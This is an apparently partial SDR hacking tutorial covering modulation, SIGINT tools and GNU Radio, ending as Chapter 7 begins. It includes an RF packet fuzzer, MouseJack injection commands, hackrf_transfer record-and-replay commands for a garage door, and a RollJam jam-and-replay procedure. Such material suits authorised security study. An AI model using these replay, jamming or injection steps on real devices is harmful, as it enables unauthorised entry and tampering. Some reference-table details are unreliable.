# SDR Hacking Advanced: Reversing and Exploiting Wireless Communications

> This guide tries to cover nearly every topic for SDR Hacking; from SIGINT identification techniques and GNU Radio flowgraph optimization through firmware vulnerability analysis, to custom RF baseband exploitation, LoRa key cracking, TEMPEST, and EM side-channel attacks.
>
> **Prerequisites assumed:** Linux proficiency, basic SDR/GNU Radio familiarity, security fundamentals. This guide extends (does not replaces) the General SDR.md section.
>
> **Legal notice:** All offensive techniques are presented for authorized security research, CTF competition, and defensive understanding only. Apply only against systems you own or have written authorization to test. RF transmission requires appropriate licensing.

---

## Table of Contents

- [Part 1: SIGINT, GNU Radio Mastery, and Signal Reversing](#part-1-sigint-gnu-radio-mastery-and-signal-reversing)
  - [Chapter 1: Key Radio Concepts Review](#chapter-1-key-radio-concepts-review)
  - [Chapter 2: Devices — Spectrum Analyzers, SDRs, and Special RF Chips](#chapter-2-devices--spectrum-analyzers-sdrs-and-special-rf-chips)
  - [Chapter 3: SIGINT — Identifying Targeted Transmissions](#chapter-3-sigint--identifying-targeted-transmissions)
  - [Chapter 4: GNU Radio — Advanced Flowgraphs](#chapter-4-gnu-radio--advanced-flowgraphs)
  - [Chapter 5: SDR Tools and Fuzzing](#chapter-5-sdr-tools-and-fuzzing)
- [Part 2: Attacking Real Targets](#part-2-attacking-real-targets)
  - [Chapter 6: Reverse Engineering Remote Controls](#chapter-6-reverse-engineering-remote-controls)
  - [Chapter 7: Attacking Receivers](#chapter-7-attacking-receivers)
  - [Chapter 8: Reversing Custom Signals](#chapter-8-reversing-custom-signals)
  - [Chapter 9: Firmware Analysis with Ghidra](#chapter-9-firmware-analysis-with-ghidra)
  - [Chapter 10: Exploiting RF Baseband Vulnerabilities](#chapter-10-exploiting-rf-baseband-vulnerabilities)
  - [Chapter 11: Industrial Protocols and LoRa](#chapter-11-industrial-protocols-and-lora)
- [Bonus Topics](#bonus-topics)
  - [Chapter 12: TEMPEST](#chapter-12-tempest)
  - [Chapter 13: EM Side-Channel Attacks](#chapter-13-em-side-channel-attacks)
  - [Chapter 14: ZigBee](#chapter-14-zigbee)
  - [Chapter 15: Wi-Fi RF Security](#chapter-15-wi-fi-rf-security)

---

## Part 1: SIGINT, GNU Radio Mastery, and Signal Reversing

### Chapter 1: Key Radio Concepts Review

#### Wireless Connectivity — A Security Lens

Every wireless system has four exploitable layers. Understanding which layer an attack targets is the foundation of wireless security assessment:

| Layer | What It Controls | Attack Examples |
|-------|-----------------|----------------|
| **Physical (RF)** | Frequency, power, modulation | Jamming, replay, signal injection |
| **Modulation** | How bits are encoded on carrier | Demodulation to recover data; symbol manipulation |
| **Encoding** | Bit-level framing and error correction | Manchester decode errors; CRC forgery |
| **Integrity & Encryption** | Data authentication and confidentiality | Key extraction, IV reuse, weak cipher attacks |

The training CTF methodology mirrors this: start at the RF layer, work up through modulation and encoding, reach the application data, then find and exploit the security weakness.

---

#### Modulation Review — Attack-Relevant Properties

| Modulation | Key Property | Security Implication |
|-----------|-------------|---------------------|
| **OOK/ASK** | On/off keying — simple amplitude shift | Trivial replay; no inherent authentication |
| **FSK** | Two or more frequencies encode bits | Easy to decode; clock recovery straightforward |
| **GFSK** | Gaussian-filtered FSK | Bluetooth, ZigBee; slight increase in decoder complexity |
| **PSK/BPSK/QPSK** | Phase shifts encode symbols | More complex sync; common in satellite, GPS, digital voice |
| **QAM** | Combined amplitude + phase | Higher data rate; more sensitive to channel distortion |
| **OFDM** | Many subcarriers; parallel symbol streams | Wi-Fi, LTE; complex; hard to implement custom attacks |
| **DSSS** | Spread over wide bandwidth using PN code | GPS, 802.11b; PN code knowledge needed to decode |
| **FHSS** | Rapid frequency hopping | Bluetooth Classic; requires clock/offset to follow |

**Demodulation fingerprint:** Each modulation has a characteristic appearance on a waterfall and constellation plot. Training your eye to recognize these is the core SIGINT skill.

```
OOK:      Waterfall shows discrete blobs; no carrier when off
FSK:      Two parallel lines in waterfall at ±deviation
GFSK:     Same but with blurred transitions between tones
BPSK:     Single carrier; phase flips appear as spectrum broadening
QPSK:     Rotated square on constellation; 4 phase states
QAM-16:   4×4 grid on constellation
OFDM:     Flat-topped rectangular spectrum; many subcarriers visible
DSSS:     Noise-like; flat broad spectrum; looks like interference
```

---

#### Encoding Review

Bit encoding determines how raw data is converted to a bit stream. Protocol reversing requires identifying the encoding before the data makes sense.

| Encoding | Description | How to Identify |
|----------|-------------|----------------|
| **NRZ (Non-Return to Zero)** | 1 = high, 0 = low; no transitions for same consecutive bits | DC bias; prone to synchronization loss on long runs |
| **NRZ-I** | Transition on 1, no transition on 0 | USB, HDLC; more common in digital protocols |
| **Manchester** | Transition in every bit period; 1 = high-to-low, 0 = low-to-high | Constant transitions; bandwidth = 2× bit rate |
| **Differential Manchester** | Mid-bit transition always; edge at start encodes data | Ethernet 10BASE-T |
| **4B5B** | Groups of 4 bits encoded as 5-bit symbols | USB, 100BASE-TX; output always has ≤3 consecutive same bits |
| **8B10B** | 8 data bits → 10 line bits | SATA, Fibre Channel; DC balance maintained |
| **UART framing** | Start bit + data bits + [parity] + stop bit(s) | Asynchronous; identifies as OOK-like bursts |

**Detecting Manchester encoding:**

```python
import numpy as np

def detect_manchester(bits, tolerance=0.1):
    """
    Check if a bit stream uses Manchester encoding.
    Manchester: every bit period has exactly one transition.
    """
    # Count transitions per symbol period
    # Assumes already at 2x oversampling (2 samples per bit)
    transitions = []
    for i in range(0, len(bits) - 1, 2):
        pair = bits[i:i+2]
        # Manchester: valid pairs are [1,0] (bit=1) or [0,1] (bit=0)
        if list(pair) in [[1, 0], [0, 1]]:
            transitions.append(1)
        else:
            transitions.append(0)
    
    transition_rate = sum(transitions) / len(transitions)
    return transition_rate > (1 - tolerance)

def decode_manchester(bits):
    """Decode Manchester-encoded bit stream to data bits"""
    decoded = []
    for i in range(0, len(bits) - 1, 2):
        if bits[i] == 1 and bits[i+1] == 0:
            decoded.append(1)  # High-to-low = 1 (IEEE 802.3)
        elif bits[i] == 0 and bits[i+1] == 1:
            decoded.append(0)  # Low-to-high = 0
        else:
            # Sync or error
            decoded.append(-1)
    return decoded
```

---

#### Integrity and Encryption in Wireless Protocols

Most consumer wireless protocols use weak or no integrity protection. Understanding what's actually being protected (and what isn't) is critical for attack planning.

**Common integrity mechanisms:**

| Mechanism | Strength | Common In | Attack |
|-----------|---------|-----------|--------|
| **None** | Zero | Simple remotes, sensors | Raw replay |
| **CRC-8/16/32** | Error detection only; no authentication | Many ISM devices | CRC is easily recalculated for modified data |
| **Rolling code (KeeLoq)** | Pseudo-random code sequence | Car keyfobs | MitM capture + resync attacks; KeeLoq cryptanalysis |
| **CMAC / HMAC** | Strong if key is protected | Modern IoT | Key extraction via side-channel or firmware |
| **AES-CCM / AES-GCM** | Strong | ZigBee, Bluetooth, LoRa | IV/nonce reuse; key management failures |
| **Proprietary cipher** | Often weak | Industrial, custom | Reverse engineer cipher; often linear or trivially breakable |

---

### Chapter 2: Devices — Spectrum Analyzers, SDRs, and Special RF Chips

#### Spectrum and Signal Analyzers

Beyond SDRs, dedicated spectrum analyzers provide higher dynamic range, real-time capture, and calibrated measurements for professional RF assessment.

| Device | Range | Real-Time BW | Cost | Notes |
|--------|-------|-------------|------|-------|
| **TinySA Ultra** | 100 kHz–5.3 GHz | ~800 kHz | ~$110 | Portable; handheld; good for field work |
| **NanoVNA** | 10 kHz–1.5 GHz | Swept | ~$50 | Vector network analyzer; characterize filters and antennas |
| **Signal Hound BB60C** | 9 kHz–6 GHz | 27 MHz RBW | ~$2,900 | Professional; software defined |
| **Rohde & Schwarz FPC1500** | 5 kHz–3 GHz | 10 MHz | ~$3,500 | Benchtop; high accuracy |
| **RIGOL DSA815** | 9 kHz–1.5 GHz | Swept | ~$1,200 | Accessible benchtop option |

**TinySA Ultra** is the practical field tool — pair it with your SDR for initial site survey and signal characterization before committing capture bandwidth.

```
TinySA Ultra workflow:
1. Sweep target band → identify occupied channels
2. Measure signal level (dBm) and approximate bandwidth
3. Tune SDR to most interesting frequency
4. Capture IQ for analysis
```

#### Special RF Chips and Their Attack Surface

RF SoCs (System-on-Chip) integrate the entire radio stack — from RF front end through baseband processing to microcontroller. Vulnerabilities at the chip level affect every device using that silicon.

| Chip | Protocol | Used In | Known Issues |
|------|---------|---------|-------------|
| **TI CC1101** | Sub-GHz FSK/OOK | ISM devices, meters, alarms | No encryption standard; OTA programming mode |
| **TI CC2500** | 2.4 GHz FSK | RC controllers, mice, keyboards | MouseJack attack surface |
| **TI CC2530/31** | ZigBee/IEEE 802.15.4 | Smart home, industrial | ZigBee key transport weaknesses |
| **Nordic nRF24L01** | 2.4 GHz proprietary | Wireless keyboards, mice, drones | MouseJack; ShockBurst protocol weaknesses |
| **Nordic nRF52** | BLE | IoT, wearables | OTA DFU vulnerabilities; GATT exploit surface |
| **Silicon Labs EFR32** | Multi-protocol | Smart home | ZigBee/BLE stack CVEs |
| **Semtech SX1276** | LoRa | LoRaWAN devices | Key management; replay; join accept forgery |
| **ESP8266/ESP32** | Wi-Fi + BLE | DIY IoT everywhere | Known RCEs in SDK history; often no OTA signing |

**MouseJack — nRF24L01 attack:**

```python
# MouseJack exploits the nRF24L01's Enhanced ShockBurst protocol
# Many wireless keyboards/mice accept unencrypted packets injected 
# from any device broadcasting on the same address

# Tools: 
# CrazyRadio PA (nRF24LU1 USB dongle) + Bastille's MouseJack tools
# pip install pynput

# Basic scan for vulnerable devices
# mousejack scan     # Scan for vulnerable devices
# mousejack sniff [addr]   # Passive sniff specific device
# mousejack inject [addr] [HID payload]  # Inject keystrokes (authorized only)
```

---

### Chapter 3: SIGINT — Identifying Targeted Transmissions

SIGINT (Signals Intelligence) in the SDR context means rapidly characterizing unknown signals in a dense RF environment — determining what you're looking at before investing in deep analysis.

#### The SIGINT Mindset

```
See it → Measure it → Name it → Decode it → Exploit it

Time budget:
  See/Measure: 30 seconds (spectrum + waterfall visual)
  Name:        2 minutes (database lookup + modulation ID)
  Decode:      5–30 minutes (tool selection + demod)
  Exploit:     Hours to days (depends on depth)
```

#### Rapid Signal Characterization

**Visual spectrum classification (30-second drill):**

```
Step 1: Look at bandwidth
  < 5 kHz     → Narrowband voice, CW, simple data
  5–25 kHz    → NBFM voice, basic digital
  25–200 kHz  → WBFM, wider digital protocols
  200 kHz–5 MHz → Multiple channels, spread spectrum, wideband digital
  > 5 MHz     → OFDM (Wi-Fi, LTE), UWB

Step 2: Look at spectral shape
  Sharp single peak → CW or unmodulated carrier
  Two-humped       → FSK (two tones visible)
  Flat-top         → OFDM or noise-like (DSSS)
  Raised cosine    → PSK/QAM (roll-off factor visible)
  Asymmetric       → SSB (one sideband only)

Step 3: Look at temporal behavior
  Continuous → Broadcast, beacons, control channels
  Bursty → Data packets, remote controls, sensors
  Periodic → Beacons, TDMA slots, clock signals
  Triggered → Sensors, alarm systems, access control
```

**Waterfall pattern library:**

| Pattern | Signal Type |
|---------|------------|
| Steady horizontal band | Continuous carrier or broadcast |
| Short vertical slashes | OOK bursts (keyfobs, sensors) |
| Paired parallel lines | FSK |
| Comb pattern (many vertical lines) | OFDM; 802.11 beacon |
| Diagonal drift | Doppler shift; moving transmitter |
| Regular rectangular blocks | TDMA (GSM, TETRA, DMR) |
| Wideband static-looking | FHSS or DSSS; need to zoom out |

---

#### SIGINT Tools and Libraries

**Inspectrum** — Primary tool for visual binary analysis:

```bash
sudo apt install inspectrum
inspectrum capture.iq

# Inspectrum key features:
# - Adjustable sample rate and time zoom
# - Symbol extraction: click threshold to get binary output
# - Symbol period detection via autocorrelation
# - Export symbols to file for further analysis
```

**SigDigger** — Signal analyzer with demodulation:

```bash
# Install from: https://github.com/BatchDrake/SigDigger
# Provides:
#   - Wideband spectrum + waterfall
#   - Click-to-demodulate: point at any signal; choose demod type
#   - Channel recording
#   - Doppler tracking
```

**Universal Radio Hacker (URH)** — The primary protocol reversing tool:

```bash
pip install urh
urh

# URH workflow:
# 1. File → Open IQ file (or live capture via SDR)
# 2. Signal tab: adjust modulation type and parameters; view bits
# 3. Analysis tab: automatic protocol analysis; find preamble/sync
# 4. Generator tab: create and transmit modified packets (authorized only)
# 5. Simulator tab: multi-device protocol simulation
```

**Baudline** — High-resolution spectral analysis:

```bash
# Baudline is a standalone binary; download from baudline.com
# Key capabilities:
#   - Very high FFT resolution (up to 2M points)
#   - Frequency and time domain views simultaneously  
#   - Phase display; group delay
#   - Excellent for manual modulation identification
```

---

#### Machine and Deep Learning for Signal Identification

Automated signal classification using ML has become practical for SIGINT workflows.

**RadioML dataset and models:**

The RadioML 2018.01A dataset (DeepSig) contains 24 modulation classes captured under realistic channel conditions. Pre-trained models achieve ~90%+ classification accuracy.

```python
import numpy as np
import torch
import torch.nn as nn

class RadioMLClassifier(nn.Module):
    """
    Simplified CNN for radio modulation classification.
    Input: (batch, 2, 1024) — I and Q as two channels.
    Output: class probabilities for modulation types.
    """
    def __init__(self, n_classes=11):
        super().__init__()
        self.conv_stack = nn.Sequential(
            nn.Conv1d(2, 64, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.Conv1d(64, 64, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.MaxPool1d(2),
            nn.Conv1d(64, 128, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.Conv1d(128, 128, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.MaxPool1d(2),
        )
        self.classifier = nn.Sequential(
            nn.Flatten(),
            nn.Linear(128 * 256, 256),
            nn.ReLU(),
            nn.Dropout(0.5),
            nn.Linear(256, n_classes),
        )
    
    def forward(self, x):
        return self.classifier(self.conv_stack(x))

# Modulation classes
MOD_CLASSES = ['OOK', 'ASK4', 'ASK8', 'BPSK', 'QPSK', '8PSK',
               'QAM16', 'QAM64', 'WBFM', 'AM-DSB', 'AM-SSB']

def classify_signal(iq_samples, model, n_samples=1024):
    """Classify modulation type from IQ samples"""
    # Take a chunk from the middle of the capture
    start = len(iq_samples)//2 - n_samples//2
    chunk = iq_samples[start:start + n_samples]
    
    # Normalize
    chunk = chunk / (np.std(chunk) + 1e-8)
    
    # Format as (2, N) tensor
    x = torch.tensor(
        np.stack([chunk.real, chunk.imag], axis=0),
        dtype=torch.float32
    ).unsqueeze(0)  # Add batch dimension
    
    with torch.no_grad():
        logits = model(x)
        probs = torch.softmax(logits, dim=1)[0]
    
    top3 = torch.topk(probs, 3)
    results = []
    for prob, idx in zip(top3.values, top3.indices):
        results.append((MOD_CLASSES[idx], prob.item()))
    
    return results

# Usage:
# model = RadioMLClassifier()
# model.load_state_dict(torch.load('radioml_weights.pt'))
# print(classify_signal(iq_samples, model))
```

**gr-inspector** — GNU Radio module for automated signal detection and classification:

```bash
# Install gr-inspector
sudo apt install gnuradio-inspector  # or build from source
# Provides GNU Radio blocks:
#   - Signal Detector: finds signal edges in spectrum
#   - Feature Extraction: extracts classification features
#   - Modulation Classifier: ML-based mod type identification
```

**SigMF (Signal Metadata Format)** — Standardized format for annotating IQ captures:

```python
import sigmf
from sigmf import SigMFFile
from datetime import datetime

# Annotate a capture with signal metadata
meta = SigMFFile(
    data_file='capture.iq',
    global_info={
        SigMFFile.DATATYPE_KEY: 'cf32_le',       # complex float32, little-endian
        SigMFFile.SAMPLE_RATE_KEY: 2400000,
        SigMFFile.DESCRIPTION_KEY: 'ISM band capture — keyfob analysis',
        SigMFFile.AUTHOR_KEY: 'PNWC Red Team',
        SigMFFile.DATETIME_KEY: datetime.utcnow().isoformat(),
    }
)

# Add capture annotation (what was seen)
meta.add_annotation(
    start_index=100000,
    length=50000,
    metadata={
        SigMFFile.FQN_KEY: 'core:annotation',
        'core:label': 'keyfob_burst',
        'core:comment': 'Button press #1; OOK; ~4 kHz bandwidth; 433.92 MHz',
        'hw:frequency': 433920000,
        'hw:modulation': 'OOK',
    }
)

meta.tofile('capture.sigmf-meta')
```

---

#### Building a SIGINT Analysis Environment

```bash
#!/bin/bash
# SIGINT toolchain setup

# Core SDR
sudo apt install -y gnuradio gr-osmosdr rtl-sdr hackrf

# Signal analysis
sudo apt install -y inspectrum gqrx-sdr
pip install urh sigMF

# Visualization
pip install matplotlib numpy scipy pyrtlsdr

# Protocol databases
sudo apt install -y rtl-433  # 200+ ISM device protocols

# ML signal classification
pip install torch torchvision
# Download RadioML dataset: https://www.deepsig.ai/datasets

# Custom GNU Radio modules
# gr-inspector (signal detection)
git clone https://github.com/gnuradio/gr-inspector
cd gr-inspector && mkdir build && cd build
cmake .. && make -j4 && sudo make install

# JAERO (ACARS/aviation data)
# QSpectrumAnalyzer (spectrum monitoring)
# SDRAngel (comprehensive SDR platform with many decoders)
pip install sdrangel || sudo snap install sdrangel
```

---

### Chapter 4: GNU Radio — Advanced Flowgraphs

#### Building a Signal Analyzer Flowgraph

A comprehensive analyzer flowgraph goes beyond a simple spectrum display — it provides synchronized time, frequency, constellation, and power views:

```
[osmocom Source]
      │ (complex, samp_rate)
      ├──────────────────────────────────────┐
      │                                      │
      ▼                                      ▼
[QT GUI Frequency Sink]           [Rational Resampler] → decimated
(Full spectrum view)                    │
                                        ▼
                               [QT GUI Waterfall Sink]
                               (Time-frequency history)
                                        │
                               [Complex to Mag²]
                                        ▼
                               [QT GUI Time Sink]
                               (Power envelope vs time)
```

**Adding a variable center frequency slider:**

In GRC, add a QT GUI Range block:
- ID: `center_freq`
- Label: Center Frequency
- Default: 433920000
- Min: 1000000 / Max: 6000000000
- Step: 100000
- Widget: Counter + Slider

Connect to osmocom Source's `center_freq` parameter via the variable name. The slider updates the SDR tuning in real time.

#### Interfacing with Radio Channels — Channel Models

For testing demodulators and decoders against realistic impairments, GNU Radio's channel model blocks simulate real propagation:

```
[Signal Source] → [AWGN Channel] → [Selective Fading Channel] → [Demodulator]
```

**Channel model blocks:**

| Block | Simulates | Key Parameters |
|-------|----------|---------------|
| **AWGN** | Additive white Gaussian noise | Noise voltage = √(SNR) |
| **Selective Fading** | Multipath; Rayleigh/Rician fading | Delay spread, Doppler, fading type |
| **Phase Noise** | Local oscillator phase noise | Phase noise PSD |
| **Frequency Offset** | Carrier frequency offset | ppm error |
| **Timing Error** | Clock offset between TX and RX | Parts-per-million drift |

```python
# Python equivalent: add noise to test your decoder
import numpy as np

def add_awgn(signal, snr_db):
    """Add AWGN noise to complex baseband signal"""
    signal_power = np.mean(np.abs(signal)**2)
    noise_power = signal_power / (10**(snr_db/10))
    noise = np.sqrt(noise_power/2) * (
        np.random.randn(len(signal)) + 1j * np.random.randn(len(signal))
    )
    return signal + noise

def add_freq_offset(signal, offset_hz, sample_rate):
    """Simulate carrier frequency offset"""
    t = np.arange(len(signal)) / sample_rate
    return signal * np.exp(2j * np.pi * offset_hz * t)

def add_phase_noise(signal, phase_noise_std=0.01):
    """Simulate local oscillator phase noise"""
    phase_noise = np.random.randn(len(signal)) * phase_noise_std
    # Cumulative phase (integrated noise)
    cum_phase = np.cumsum(phase_noise)
    return signal * np.exp(1j * cum_phase)
```

#### Reversing Analog and Digital Communications in GNU Radio

**CTF-style analog reversing workflow:**

```
Scenario: You receive a mystery IQ file. No information provided.

Flowgraph 1: Visual identification
  [File Source (complex)] → [QT GUI Frequency Sink]
                          → [QT GUI Waterfall Sink]
  Observation: Signal bandwidth ~12 kHz; carrier visible; FM-like

Flowgraph 2: Try FM demodulation  
  [File Source] → [NBFM Receive] → [Audio Sink]
  Observation: Voice audio decoded — it's FM voice comms

Flowgraph 3: Extract and analyze content
  [File Source] → [NBFM Receive] → [File Sink (float)]
  Then analyze audio WAV for hidden data (sub-tones, DTMF, data beneath voice)
```

**CTF-style digital reversing workflow:**

```
Scenario: Captured burst signal; appears FSK; unknown protocol.

Step 1: Measure symbol rate
  [File Source] → [Complex to Mag²] → [QT GUI Frequency Sink]
  Peak in power spectrum of |IQ|² = symbol rate

Step 2: Demodulate to bits
  [File Source] → [Quadrature Demod] → [Binary Slicer] → [File Sink (byte)]
  Alternatively: use inspectrum for visual bit extraction

Step 3: Identify encoding
  Import bits into URH → Analysis tab → auto-detect encoding

Step 4: Parse protocol
  Find preamble/sync; identify length fields; checksum position
```

#### Optimizing Flowgraphs for Performance

Real-time processing of high-sample-rate data challenges CPU performance. Optimization techniques:

**Use the right data types:**
- Process at complex (IQ) only as long as needed; switch to float after demodulation
- Byte streams for decoded bits; use `Pack K Bits` block to reduce data volume

**Minimize sample rate early:**

```
BAD:  [Source @ 2.4MSa/s] → [many blocks] → [Decimator at end]
GOOD: [Source @ 2.4MSa/s] → [Decimator] → [blocks at 240kSa/s]
```

**Multithreading in GNU Radio:**

```python
# In GRC Python: enable multithreaded scheduler
# Edit generated Python script:
tb.start()
# Change to:
tb.start(max_noutput_items=1000)  # Tune buffer size

# Or use GNU Radio's parallel scheduler:
# In .grc file, set thread_safe_setters = True for variable blocks
```

**VOLK (Vector Optimized Library of Kernels):**

GNU Radio uses VOLK to automatically select SIMD-optimized implementations (SSE, AVX, NEON) for DSP operations. Run the alignment tool once per machine:

```bash
volk_profile    # Benchmarks and selects optimal SIMD kernels; run once
# Results saved to ~/.volk/volk_config
```

---

### Chapter 5: SDR Tools and Fuzzing

#### Accelerating RE with Specialized Tools

**rtl_433 — protocol decoder:**

```bash
# Decode 200+ known ISM protocols; output unknown ones in raw form
rtl_433 -f 433.92M -A   # Pulse analyzer mode; shows OOK timing even for unknown signals

# JSON output for scripting
rtl_433 -f 433.92M -F json 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        print(f\"{d.get('model','?')}: {d}\")
    except: pass
"

# Analyze a captured file
rtl_433 -r capture.cu8 -A   # cu8 = unsigned 8-bit IQ from rtl_sdr
```

**URH automation — scripting protocol analysis:**

```python
# URH can be driven programmatically for automated analysis
from urh.signalprocessing.Signal import Signal
from urh.signalprocessing.ProtocolAnalyzer import ProtocolAnalyzer
from urh.util.WSPDecoder import WSPDecoder

# Load captured IQ
signal = Signal("capture.complex", name="keyfob", sample_rate=2e6)
signal.modulation_type = "FSK"
signal.bit_length = 200   # Samples per bit (adjust to match)

# Decode to bit strings
pa = ProtocolAnalyzer(signal)
pa.get_protocol_from_signal()

for msg in pa.messages:
    print(msg.plain_bits_str)
```

#### Dumb Fuzzing of Communications

Dumb fuzzing applies random mutations to known-good packets and transmits them to observe target behavior. Effective against parsers with no or weak input validation.

**Fuzzing architecture:**

```
[Capture baseline packet]
       │
       ▼
[Parse packet structure]
(identify fields: preamble, length, data, CRC)
       │
       ▼
[Mutation engine]
(bitflip, byte substitution, length corruption, field boundary)
       │
       ▼
[Transmit mutated packet] ← HackRF or compatible TX hardware
       │
       ▼
[Observe target behavior]
(Crash? Different response? Error message on UART?)
```

```python
import random
import struct
import numpy as np

class RFPacketFuzzer:
    def __init__(self, baseline_packet: bytes):
        self.baseline = bytearray(baseline_packet)
        self.mutations_applied = []
    
    def bitflip(self, packet: bytearray, n_bits: int = 1) -> bytearray:
        """Flip n random bits"""
        mutated = bytearray(packet)
        for _ in range(n_bits):
            byte_idx = random.randint(0, len(mutated) - 1)
            bit_idx = random.randint(0, 7)
            mutated[byte_idx] ^= (1 << bit_idx)
        return mutated
    
    def byte_substitute(self, packet: bytearray, 
                         field_start: int, field_end: int) -> bytearray:
        """Replace bytes in a specific field with random values"""
        mutated = bytearray(packet)
        for i in range(field_start, field_end):
            mutated[i] = random.randint(0, 255)
        return mutated
    
    def length_mutation(self, packet: bytearray, 
                         length_field_offset: int, 
                         field_size: int = 1) -> bytearray:
        """Corrupt the length field — common parser bug trigger"""
        mutated = bytearray(packet)
        # Try extreme values: 0, max, max+1, actual+large
        extreme_lengths = [0, 0xFF, 0xFFFF, len(packet) + 100, 0]
        new_len = random.choice(extreme_lengths)
        
        if field_size == 1:
            mutated[length_field_offset] = new_len & 0xFF
        elif field_size == 2:
            struct.pack_into('>H', mutated, length_field_offset, new_len & 0xFFFF)
        return mutated
    
    def recalculate_crc(self, packet: bytearray, 
                          crc_offset: int, data_start: int, data_end: int):
        """Recalculate CRC so mutated packet passes integrity check"""
        import crcmod
        crc16 = crcmod.predefined.mkCrcFun('crc-16')
        crc = crc16(bytes(packet[data_start:data_end]))
        struct.pack_into('>H', packet, crc_offset, crc)
        return packet
    
    def generate_corpus(self, n_packets: int = 1000, 
                         strategy: str = 'mixed') -> list:
        """Generate a fuzzing corpus"""
        corpus = []
        for i in range(n_packets):
            packet = bytearray(self.baseline)
            
            if strategy == 'bitflip' or (strategy == 'mixed' and i % 3 == 0):
                packet = self.bitflip(packet, n_bits=random.randint(1, 8))
            elif strategy == 'substitute' or (strategy == 'mixed' and i % 3 == 1):
                start = random.randint(1, len(packet)-2)
                end = random.randint(start+1, len(packet)-1)
                packet = self.byte_substitute(packet, start, end)
            else:
                # Random byte appended or truncated
                if random.random() > 0.5:
                    packet.append(random.randint(0, 255))
                elif len(packet) > 3:
                    packet = packet[:-1]
            
            corpus.append(bytes(packet))
        return corpus

# Example usage:
# fuzzer = RFPacketFuzzer(baseline_packet=b'\xAA\xAA\xD3\x91\x40\x00\xFF\x12\x34\xAB\xCD')
# corpus = fuzzer.generate_corpus(1000)
# for packet in corpus:
#     modulate_and_transmit(packet)  # via HackRF
#     response = monitor_target(timeout=0.5)
#     if response == 'crash' or response == 'unexpected':
#         save_crash(packet)
```

**GNU Radio-based fuzzer flowgraph:**

```
[Python Source Block]     ← Generates mutated packet bytes from fuzzer
      │ (message)
      ▼
[Protocol Formatter]      ← Adds preamble, encoding, framing
      │
      ▼
[GFSK/OOK Modulator]      ← Modulate to RF
      │
      ▼
[osmocom Sink]             ← Transmit (HackRF)
```

---

## Part 2: Attacking Real Targets

### Chapter 6: Reverse Engineering Remote Controls

Remote controls are ideal training targets — commonly available, no ongoing service dependency, clear success criterion (device responds to forged signal).

#### The Remote Control Attack Chain

```
1. CAPTURE: Record IQ during button press
2. IDENTIFY: Determine frequency, modulation, encoding
3. DECODE: Extract the bit pattern
4. ANALYZE: Understand the protocol structure  
5. FORGE: Create a valid packet (replay or constructed)
6. TRANSMIT: Send to target device (authorized testing)
```

#### Step-by-Step: Garage Door Opener RE

**Target characteristics:** Most North American garage doors operate on 315 MHz or 390 MHz (older) or 433.92 MHz (newer). Common modulations: OOK (PWM or on/off), FSK. Older fixed-code remotes are trivially replayable; rolling-code (KeeLoq) requires more sophistication.

```bash
# Step 1: Find the frequency
# Check FCC ID database: fccid.io — search the FCC ID on the remote label
# This gives frequency, modulation type, sometimes internal photos

# Step 2: Capture
rtl_sdr -f 315000000 -s 250000 -g 50 -n 2500000 capture_315.cu8
# Press button during capture (2.5M samples = 10 seconds)

# Step 3: Inspect with inspectrum
inspectrum capture_315.cu8 -r 250000

# Step 4: Measure
# In inspectrum: zoom to a single button press
# Measure pulse widths: short pulse vs long pulse
# Short = 300μs, Long = 600μs → PWM encoding (short=0, long=1) or vice versa

# Step 5: Decode
rtl_433 -r capture_315.cu8 -f 315M -A  # Auto-analyze; may identify make/model
```

**PWM (Pulse Width Modulation) decoding:**

```python
import numpy as np
from scipy.signal import find_peaks

def decode_ook_pwm(iq_samples, sample_rate, 
                    short_pulse_us=300, long_pulse_us=600):
    """
    Decode OOK PWM encoding.
    Short pulse = '0', Long pulse = '1' (or vice versa — need to determine empirically)
    """
    # Get envelope (magnitude of complex signal)
    envelope = np.abs(iq_samples)
    
    # Threshold to get binary signal
    threshold = (np.max(envelope) + np.min(envelope)) / 2
    binary = (envelope > threshold).astype(int)
    
    # Find transitions
    edges = np.diff(binary)
    rising_edges = np.where(edges == 1)[0]
    falling_edges = np.where(edges == -1)[0]
    
    # Measure pulse widths
    bits = []
    short_samples = int(short_pulse_us * 1e-6 * sample_rate)
    long_samples  = int(long_pulse_us  * 1e-6 * sample_rate)
    tolerance = 0.3  # 30% tolerance
    
    for i, rising in enumerate(rising_edges):
        if i < len(falling_edges):
            pulse_width = falling_edges[i] - rising
            
            if abs(pulse_width - short_samples) < short_samples * tolerance:
                bits.append(0)
            elif abs(pulse_width - long_samples) < long_samples * tolerance:
                bits.append(1)
            else:
                bits.append(-1)  # Unknown width
    
    return bits

def bits_to_hex(bits):
    """Convert list of bits to hex string"""
    # Pad to multiple of 8
    while len(bits) % 8:
        bits.append(0)
    
    hex_str = ''
    for i in range(0, len(bits), 8):
        byte = 0
        for j, bit in enumerate(bits[i:i+8]):
            byte |= (bit << (7 - j))
        hex_str += f'{byte:02X}'
    return hex_str
```

---

#### Fixed Code vs. Rolling Code

**Fixed code systems:** The same bit pattern is transmitted every button press. Trivially vulnerable to replay.

```bash
# Record a button press
hackrf_transfer -r door_open.iq -f 315000000 -s 2000000 -g 40 -l 32 -n 2000000

# Replay it (authorized testing only)
hackrf_transfer -t door_open.iq -f 315000000 -s 2000000 -x 40 -a 1
```

**Rolling code (KeeLoq):** Each button press generates a new code using a keyed block cipher (KeeLoq). The receiver accepts only codes in a forward window from the last used counter value.

**KeeLoq weaknesses:**

1. **Relay/amplification attack:** No RF attack needed — extend the range of the legitimate fob signal to the receiver without capturing any code.

2. **MitM desync attack ("RollJam"):** Jam the receiver while capturing the code; victim presses button twice; you have two valid codes. First captured code is never consumed by the receiver. Replay first code; victim thinks it worked (second code opened it); you use the captured second code later.

3. **Cryptanalytic attack:** KeeLoq has known weaknesses; with 65,536 button presses from the same fob (or similar), the 64-bit manufacturer key can be extracted. Practical for research, not casual attack.

```
RollJam attack flow:
  1. Attacker device jams the frequency
  2. Victim presses button → code1 transmitted but jammed; receiver never sees it
     Attacker captures code1
  3. Victim presses button again → code2 transmitted but jammed
     Attacker captures code2
     Attacker immediately replays code1 → receiver opens; victim satisfied
  4. Attacker now holds code2 — valid unused code
  5. Later: attacker replays code2 → opens device
```

---

### Chapter 7: Attacking Receivers

The receiver is often more vulnerable than the transmitter — it must accept and process all incoming signals on its operating frequency.

